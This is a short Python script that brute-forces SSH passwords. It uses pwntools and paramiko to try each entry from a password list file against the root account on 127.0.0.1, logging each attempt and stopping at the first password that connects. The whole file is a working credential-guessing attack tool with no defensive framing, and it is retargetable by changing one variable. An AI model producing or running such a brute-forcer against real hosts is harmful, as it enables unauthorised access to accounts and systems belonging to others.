#!/bin/python3
# import nl,pr,ty,pb from '/basic.py'

def nl():
    print('\t')

def pr(a):
    print(a)

from pwn import * 
import paramiko

host = '127.0.0.1'
username = 'root'
attemps = 0

with open('10.txt','r') as passwordList:
    for password in passwordList:
        password= password.strip('\n')
        try:
            pr('[{}] attempting password: \'{}\'!'.format(attemps,password))
            response=ssh(host=host,user=username,password=password)
            if response.connected():
                pr('[>] valid password found: \'{}\'!'.format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            pr('[x] Invalid password!')
        attemps +=1
